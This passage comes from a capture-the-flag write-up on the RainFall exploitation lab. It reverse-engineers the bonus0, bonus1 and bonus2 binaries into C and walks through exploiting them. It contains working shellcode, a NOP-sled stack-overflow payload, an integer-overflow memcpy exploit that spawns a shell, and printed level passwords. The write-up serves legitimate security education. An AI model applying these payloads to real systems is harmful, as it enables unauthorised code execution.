   0x0804857f <+97>:    sub    eax,0x1 ; Remove 1 to eax
   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8] ; Add the value of the 1st argument of pp to eax
   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx] ; 
   0x08048588 <+106>:   mov    WORD PTR [eax],dx

   0x0804858b <+109>:   lea    eax,[ebp-0x1c] ; Set eax to ebp-0x1c (28th byte of the stack)
   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax : Set eax as 2nd argument of strcat
   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8] ; Set eax to 1st argument of pp
   0x08048595 <+119>:   mov    DWORD PTR [esp],eax : Push eax
   0x08048598 <+122>:   call   0x8048390 <strcat@plt> ; Call strcat(pp_1st_arg, eax)

   0x0804859d <+127>:   add    esp,0x50 : free allocated bytes

   0x080485a0 <+130>:   pop    ebx
   0x080485a1 <+131>:   pop    edi
   0x080485a2 <+132>:   pop    ebp
   0x080485a3 <+133>:   ret
End of assembler dump.

Dump of assembler code for function p:
   0x080484b4 <+0>:     push   ebp
   0x080484b5 <+1>:     mov    ebp,esp

   0x080484b7 <+3>:     sub    esp,0x1018 ; Allocate 0x1018 (4120) bytes on the stack
   0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc] ; Set eax to 2nd argument of p
   0x080484c0 <+12>:    mov    DWORD PTR [esp],eax ; Push eax
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt> ; Call puts(p_2nd_arg)

   0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000 ; Set 3rd argument of read to 4096
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008] ; Set eax to 4104th byte of the stack
   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax ; Set eax to 2nd argument of read
   0x080484da <+38>:    mov    DWORD PTR [esp],0x0 ; Set 0 as 1st argument of read
   0x080484e1 <+45>:    call   0x8048380 <read@plt> ; Call read(0, ebp-0x1004, 4096)

   0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa ; Set 2nd argument of strchr to 0xa (10)
   0x080484ee <+58>:    lea    eax,[ebp-0x1008] ; Set eax to 4104th byte of the stack 
   0x080484f4 <+64>:    mov    DWORD PTR [esp],eax ; Set the 1st argument of strchr to eax
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt> ; Call strchr(ebp-0x1004, 10);

   0x080484fc <+72>:    mov    BYTE PTR [eax],0x0 ; Set the value of the return address of strchr to 0

   0x080484ff <+75>:    lea    eax,[ebp-0x1008] ; Set eax to ebp-0x1008
   0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14 ; Set the 3rd argument of strncpy to 0x14 (20)
   0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax ; Set the 2nd argument of strncpy to eax
   0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the 1st argument of p
   0x08048514 <+96>:    mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strncpy
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> ; Call strncpy(p_1st_arg, ebp-0x1008, 20)

   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
```

### Equivalent C source code

```c
void p(char *p_1st_arg, char *p_2nd_arg)
{
	char buff[4104];

	puts(p_2nd_arg);
	read(0, buff, 4096);

	*strchr(buff, 10 /* '\n' */) = 0;

	strncpy(p_1st_arg, buff, 20);
	return;
}


void pp(char *pp_1st_arg)
{
	char str1[20];
	char str2[20];

	p(str1, " - ");
	p(str2, " - ");

	strcpy(pp_1st_arg, str1);
	pp_1st_arg[strlen(pp_1st_arg)] = 32; // ' '

	strcat(pp_1st_arg, str2);
	return;
}

int		main()
{
	unsigned char	buf[64];

	pp(buf + 22);
	puts(buf + 22);
	return (0);
}
```

### Walktrough

```
bonus0@RainFall:~$ ./bonus0
 -
a
 -
a
a a

bonus0@RainFall:~$ python -c 'print "A" * 50'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Without looking at the code, we can see the program segfaults when we pass large strings

Let's grab a string from https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ and try again to find EIP offset

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2...
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac...
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

With Eip equals to `0x41336141`, we know our offset is 9!

Let's inject a shellcode in our environment

```bash
export SHELLCODE="$(echo -n -e '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')"

bonus0@RainFall:~$ gdb ./bonus0
(gdb) b main
Breakpoint 1 at 0x80485a7

(gdb) r
Starting program: /home/user/bonus0/bonus0
Breakpoint 1, 0x080485a7 in main ()

(gdb) x/1s *((char **)environ)
0xbffff8b6:	 "SHELLCODE=j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
```

We can see our shellcode is stored at address `0xbffff8b6 + 0xa (equals to strlen("SHELLCODE="))` so `0xbffff8c0`

To be sure it is hit, let's add a big enough nopsled and try to execute the shellcode

```bash
bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')

bonus0@RainFall:~$ gdb ./bonus0 --eval-command='b main' --eval-command='r' --eval-command='print *((char **)environ)' --eval-command='quit'
...
Breakpoint 1 at 0x80485a7
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080485a7 in main ()
$1 = 0xbfffe8b6 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
A debugging session is active.

	Inferior 1 [process 3637] will be killed.

Quit anyway? (y or n) y

bonus0@RainFall:~$ python -c 'print(hex(0xbfffe8b6 + 512))'
0xbfffeab6L

bonus0@RainFall:~$ python -c 'print "A" * 4095 + "\n" + "\x90" * 9 + "\xb6\xea\xff\xbf" + "AAAA" * 50' > /tmp/payload

bonus0@RainFall:~$ cat /tmp/payload - | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAA�������������AAAAAAA�� �������������AAAAAAA��
pwd
/home/user/bonus0
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Bonus1

- [`objdump -d` output](http://ix.io/2oZb)

```bash
bonus1@RainFall:~$ objdump  -R ./bonus1

./bonus1:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049760 R_386_GLOB_DAT    __gmon_start__
08049770 R_386_JUMP_SLOT   memcpy
08049774 R_386_JUMP_SLOT   __gmon_start__
08049778 R_386_JUMP_SLOT   __libc_start_main
0804977c R_386_JUMP_SLOT   execl
08049780 R_386_JUMP_SLOT   atoi
```

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	and    esp,0xfffffff0
   0x0804842a <+6>:	sub    esp,0x40
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
```

### Equivalent C code

```c
int		main(int ac, char **av) {
	int				x; // esp+0x3c
	unsigned char	buf[60]; // esp

	x = atoi(av[1]);
	if (x <= 9)
	{
		memcpy(&buf[20], av[2], x * 4);
		if (x != 0x574f4c46) // main+84 / 0x08048478
		{
			;
		}
		else 
		{
			execl("/bin/sh", "sh", 0);
		}
	}
	else
	{
		return (1);
	}

	return (0);
}
```

### Walktrough

Let's verify that argv[1] is compared with <= atoi("9") and our interpretation of the 1st if was right

```bash
bonus1@RainFall:~$ gdb ./bonus1
...
(gdb) b main
Breakpoint 1 at 0x8048427

(gdb) r 9 AAAA

(gdb) b *0x08048441 # (main+29, cmp instruction)
Breakpoint 2 at 0x8048441

(gdb) c
Continuing.

Breakpoint 2, 0x08048441 in main ()
(gdb) info registers
eax            0x9	9
ecx            0x0	0
edx            0x0	0
...

(gdb) b *0x0804844f # (main+43)
Breakpoint 3 at 0x804844f

(gdb) c
Continuing.

Breakpoint 3, 0x0804844f in main ()
# we're in the if condition!
```

```bash
bonus1@RainFall:~$ ./bonus1 9 AAAA; echo $?
0

bonus1@RainFall:~$ ./bonus1 8 AAAA; echo $?
0

bonus1@RainFall:~$ ./bonus1 10 AAAA; echo $?
1
```

Now that we're in the if we have to overwrite the value of the variable at the address `esp+0x3c` with `0x574f4c46`

```bash
bonus1@RainFall:~$ python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
AAAAAAAAAAAAFLOW

bonus1@RainFall:~$ ./bonus1 9 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')

bonus1@RainFall:~$ gdb ./bonus1
...
(gdb) b main
Breakpoint 1 at 0x8048427
(gdb) r  9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW

Breakpoint 1, 0x08048427 in main ()
(gdb) b *0x08048478
Breakpoint 2 at 0x8048478
(gdb) c
Continuing.

Breakpoint 2, 0x08048478 in main ()
(gdb) x/60x $esp
0xbffff650:	0xbffff664	0xbffff889	0x00000024	0x080482fd
0xbffff660:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x080484b9   [ 0x00000009 ]
...
```

We can see that even with enougth bytes to overflow the buffer, our value wasn't overwritten because the `memcpy` is limited to `(x * 4)` so if the max value of `x` is 9, the memcpy is limited to `36` bytes, we would need 8 more to overwrite the result of atoi()

One way of doing this would be to use a negative value for argv[1], so when doing `atoi(argv[1]) * 4`, the integer would overflow and save only the difference with int_min, the minimum value of a 4 bytes int is `-2147483648`, so if we pass `-2147483640`, our int will have the value of `(-2147483648 - -2147483640) * 4 = 32`

Let's try to make our int equals to 40 bytes to overwrite the compared value

```bash
bonus1@RainFall:~$ gdb ./bonus1
...
(gdb) b main
Breakpoint 1 at 0x8048427

(gdb) r -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
Starting program: /home/user/bonus1/bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW

Breakpoint 1, 0x08048427 in main ()

(gdb) b *0x08048478
Breakpoint 2 at 0x8048478

(gdb) c
Continuing.

Breakpoint 2, 0x08048478 in main ()

(gdb) x/60x $esp
0xbffff650:	0xbffff664	0xbffff889	0x0000002c	 0x080482fd
0xbffff660:	0xb7fd13e4	0x41414141	0x41414141	 0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	 0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141  [ 0x574f4c46 ]

(gdb) c
Continuing.
process 2853 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
$
```

Let's try again without gdb:

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
$ whoami
bonus2
$ pwd
/home/user/bonus1
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Bonus2

- [`objdump -d` output](http://ix.io/2oZD)

```bash
bonus2@RainFall:~$ objdump -R ./bonus2

./bonus2:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804994c R_386_GLOB_DAT    __gmon_start__
0804995c R_386_JUMP_SLOT   memcmp
08049960 R_386_JUMP_SLOT   strcat
08049964 R_386_JUMP_SLOT   getenv
08049968 R_386_JUMP_SLOT   puts
0804996c R_386_JUMP_SLOT   __gmon_start__
08049970 R_386_JUMP_SLOT   __libc_start_main
08049974 R_386_JUMP_SLOT   strncpy
```

### ASM Interpretation

```asm
Dump of assembler code for function main:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	push   esi
   0x0804852e <+5>:	push   ebx
   0x0804852f <+6>:	and    esp,0xfffffff0
   0x08048532 <+9>:	sub    esp,0xa0 ; Allocate 0xa0 bytes on the stack (160)

   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3 ; Compare the 1st argument of main (argc) with 3
   0x0804853c <+19>:	je     0x8048548 <main+31> ; If it's equal go to main+31

   0x0804853e <+21>:	mov    eax,0x1 ; Set eax to 1
   0x08048543 <+26>:	jmp    0x8048630 <main+263> ; Goto main+263 (end)

   0x08048548 <+31>:	lea    ebx,[esp+0x50] ; Set ebx to *(esp+0x50) (80th byte of stack)
   0x0804854c <+35>:	mov    eax,0x0 ; Set eax to 0
   0x08048551 <+40>:	mov    edx,0x13 ; Set edx to 0x13 (19)
   0x08048556 <+45>:	mov    edi,ebx ; Set edi to ebx *(80th byte of the stack)
   0x08048558 <+47>:	mov    ecx,edx ; Set ecx to edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax ; memset like operation -> https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do

   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc] ; Set eax to *(ebp+0xc), 2nd argument of main() (argv)
   0x0804855f <+54>:	add    eax,0x4 ; Add 4 to eax
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax] ; Set eax to the value pointed by it (argv[1])
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28 ; Set 0x28 as the 3rd argument of strncpy()
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax ; Set eax as the 2nd argument of strncpy()
   0x08048570 <+71>:	lea    eax,[esp+0x50] ; Set eax to the value of the 80th byte of the stack
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strncpy()
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt> ; Call strncpy(*(esp+0x50), argv[1], 0x28 (40))

   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc] ; Set eax to *(ebp+0xc), 2nd argument of main() (argv)
   0x0804857f <+86>:	add    eax,0x8 ; Add 8 to eax
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax] ; Set eax to the value pointed by it
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20 ; Set 0x20 as the 3rd argument of strncpy()
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax ; Set eax as the 2nd argument of strncpy()
   0x08048590 <+103>:	lea    eax,[esp+0x50] ; Set eax to the value of *(esp+0x50)
   0x08048594 <+107>:	add    eax,0x28 ; Add 0x28 (40) to eax
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strncpy
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt> ; Call strncpy(*(esp+0x50) + 28, argv[2], 0x20 /* (32) */)

   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738 ; (gdb) printf "%s", 0x8048738 -> "LANG"
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt> ; Call getenv("LANG")

   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax ; Set *(esp+0x9c) to eax (return of getenv)
   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0 ; Compare it to 0
   0x080485ba <+145>:	je     0x8048618 <main+239> ; If equals, goto main+239

   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2 ; Set 0x2 (2) as the 3rd argument of memcmp
   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d ; Set 0x804873d as the 2nr argument of memcmp() (gdb) printf "%s", 0x804873d -> "fi"
   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c] ; Set eax to *(esp+0x9c)
   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of memcmp()
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> ; Call memcmp(eax, "fi", 2);

   0x080485db <+178>:	test   eax,eax ; Check if eax equals to 0
   0x080485dd <+180>:	jne    0x80485eb <main+194> ; If not goto main+194

   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1 ; Set 0x8049988 to 1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239> ; Goto main+239

   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2 ; Set 3rd argument of memcmp to 0x2 (2)
   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740 ; Set 2nd argument of memcmp to 0x8048740 (gdb) printf "%s", 0x8048740 -> "nl"
   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c] ; Set eax to *(esp+0x9c)
   0x08048602 <+217>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of memcmp
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt> ; Call memcmp(*(esp+0x9c), "nl", 2);

   0x0804860a <+225>:	test   eax,eax ; Check if eax equals to 0
   0x0804860c <+227>:	jne    0x8048618 <main+239> ; If not goto main+239

   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2 ; Set 0x8049988 to 2

   0x08048618 <+239>:	mov    edx,esp ; Set edx to esp
   0x0804861a <+241>:	lea    ebx,[esp+0x50] ; Set ebx to *(esp+0x50)
   0x0804861e <+245>:	mov    eax,0x13 ; Set eax to 0x13 (19)
   0x08048623 <+250>:	mov    edi,edx ; Set edi to edx
   0x08048625 <+252>:	mov    esi,ebx ; Set esi to ebx
   0x08048627 <+254>:	mov    ecx,eax ; Set ecx to eax
   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] ; https://stackoverflow.com/questions/27804852/assembly-rep-movs-mechanism equivalent to memcpy(edi, esi, 0x13)
   0x0804862b <+258>:	call   0x8048484 <greetuser> ; Call greetuser()

   0x08048630 <+263>:	lea    esp,[ebp-0xc] ; Free allocated bytes
   0x08048633 <+266>:	pop    ebx
   0x08048634 <+267>:	pop    esi
   0x08048635 <+268>:	pop    edi
   0x08048636 <+269>:	pop    ebp
   0x08048637 <+270>:	ret
End of assembler dump.

Dump of assembler code for function greetuser:
   0x08048484 <+0>:	push   ebp
   0x08048485 <+1>:	mov    ebp,esp
   0x08048487 <+3>:	sub    esp,0x58 ; Allocate 0x58 bytes on the stack (88)

   0x0804848a <+6>:	mov    eax,ds:0x8049988 ; Set eax to the global variable
   0x0804848f <+11>:	cmp    eax,0x1 ; Compare eax with 1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54> ; If equals, goto greetuser+54

   0x08048494 <+16>:	cmp    eax,0x2 ; Compare eax with 2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> ; If equals, goto greetuser+101

   0x08048499 <+21>:	test   eax,eax ; Test if eax is equals to 0
   0x0804849b <+23>:	jne    0x804850a <greetuser+134> ; If not goto greetuser+134

   0x0804849d <+25>:	mov    edx,0x8048710 ; Set edx to 0x8048710 printf "%s", 0x8048710 -> "Hello "
   0x080484a2 <+30>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx] ; Set ecx to edx
   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx ; Set eax to ecx
   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4] ; Set ecx to edx + 0x4 and add a 0 byte after it
   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx ; Set *(eax + 0x4) to cx
   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6] ; Set edx to edx + 0x6
   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl ; Set eax + 0x6 to dl
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134> ; goto greetuser+134

   0x080484ba <+54>:	mov    edx,0x8048717 ; Set edx to 0x8048717 printf "%s", 0x8048717 -> "Hyvää päivää "
   0x080484bf <+59>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl ; strcpy equivalent
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134> ; goto greetuser+134

   0x080484e9 <+101>:	mov    edx,0x804872a ; Set edx to 0x804872a printf "%s", 0x804872a -> "Goedemiddag! "
   0x080484ee <+106>:	lea    eax,[ebp-0x48]
   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx ; strcpy equivalent
   0x08048509 <+133>:	nop

   0x0804850a <+134>:	lea    eax,[ebp+0x8] ; Set eax to 1st argument of greetuser()
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax ; Set eax as 2nd argument of strcat
   0x08048511 <+141>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of strcat
   0x08048517 <+147>:	call   0x8048370 <strcat@plt> ; Call strcat(ebp-0x48, greetuser_1st_arg)

   0x0804851c <+152>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of puts
   0x08048522 <+158>:	call   0x8048390 <puts@plt> ; Call puts(*(ebp-0x48))

   0x08048527 <+163>:	leave
   0x08048528 <+164>:	ret
End of assembler dump.
```

### Equivalent C code

```c
int		global_0x8049988 = 0;

void	*greetuser(char *str)
{
	unsigned char   buf[88];

	if (global_0x8049988 == 1)
	{
		strcpy(&buf[16], "Hyvää päivää ");
	}
	else if (global_0x8049988 == 2)
	{
		strcpy(&buf[16], "Goedemiddag! ");
	}
	else if (global_0x8049988 == 0)
	{
		strcpy(&buf[16], "Hello ");
	}

	strcat(&buf[16], str);

	puts(&buf[16]);
}

int		main(int argc, char *argv[])
{
	char			*lang; // esp+0x9c
	unsigned char	buf[156];

	if (argc == 3)
	{

		memset(&buf[80], 0, 0x13 /* (19) */);

		strncpy(&buf[80], argv[1], 0x28 /* (40) */);

		strncpy(&buf[80] + 28, argv[2], 0x20 /* (32) */);

		lang = getenv("LANG");
		if (lang == NULL)
		{
			;
		}
		else
		{
			if (memcmp(lang, "fi", 2))
			{
				if (memcmp(lang, "nl", 2))
				{
					return (1);
				}
				else
				{
					global_0x8049988 = 0x2;
				}
			}
			else 
			{
				global_0x8049988 = 0x1;
			}
		}

		// main+239
		memcpy(buf, &buf[80], 0x13 /* (19) */);
		greetuser(argv[1]);
	}
	return (1);
}

```

### Walktrough

- Export LANG=nl to be sure we don't `return 1`

```bash
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag a a
bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag a
Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Aa
